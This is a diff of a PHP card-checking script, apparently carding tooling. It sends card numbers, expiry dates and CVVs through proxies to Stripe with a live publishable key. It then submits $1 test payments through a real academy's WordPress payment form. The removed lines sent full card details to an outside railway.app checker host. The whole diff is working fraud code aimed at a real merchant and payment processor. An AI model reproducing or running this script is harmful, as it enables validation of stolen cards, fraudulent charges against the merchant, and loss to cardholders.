@@ -84,7 +84,44 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url);
 curl_setopt($ch, CURLOPT_PROXY, $proxy);
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
-curl_setopt($ch, CURLOPT_URL, 'https://lista-production-9b29.up.railway.app/chk.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'POST /v1/payment_methods h2',
+'Host: api.stripe.com',
+'accept: application/json',
+'content-type: application/x-www-form-urlencoded',
+'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+'origin: https://js.stripe.com',
+'sec-fetch-site: same-site',
+'sec-fetch-mode: cors',
+'sec-fetch-dest: empty',
+'referer: https://js.stripe.com/',
+'accept-language: en-US,en;q=0.9',
+));
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+
+////////////////////////////===[1 Req Postfields]
+
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&key=pk_live_51MWmbSICV1I3jxabAyBu86sWMgPP177PcGAwChat4WAc5SPafgMTD1biYFDqZHGUgHirfVUP3k6ypFa2uFzRl7jj00D3nJcKy6');
+
+$result1 = curl_exec($ch);
+$id = trim(strip_tags(getStr($result1,'"id": "','"')));
+sleep(3);
+
+////////////////////////////===[2 Req]
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
+curl_setopt($ch, CURLOPT_URL, 'https://5tbeautyacademy.org/wp-admin/admin-ajax.php?t=1716710321120');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -94,19 +131,26 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'GET /chk.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' h2',
-'Host: lista-production-9b29.up.railway.app',
-'user-agent: Mozilla/5.0 (Linux; Android 12; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
-'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-'sec-fetch-site: none',
-'sec-fetch-mode: navigate',
-'sec-fetch-user: ?1',
-'sec-fetch-dest: document',
+curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+'POST /wp-admin/admin-ajax.php?t=1716710321120 h2',
+'Host: 5tbeautyacademy.org',
+'accept: */*',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+'origin: https://5tbeautyacademy.org',
+'sec-fetch-site: same-origin',
+'sec-fetch-mode: cors',
+'sec-fetch-dest: empty',
+'referer: https://5tbeautyacademy.org/tuition-payment/',
 'accept-language: en-US,en;q=0.9',
-  ));
+));
+
+////////////////////////////===[2 Req Postfields]////////////////////////////
+
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D19507%26_fluentform_6_fluentformnonce%3Db962fdafb0%26_wp_http_referer%3D%252Ftuition-payment%252F%26names%255Bfirst_name%255D%3D%26names%255Blast_name%255D%3D%26email%3Dgloosmoke3434%2540gmail.com%26input_text%3DNY%26custom-payment-amount%3D1%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=6');
+
 $result2 = curl_exec($ch);
-sleep(10);
+sleep(3);
 
 // Response
 
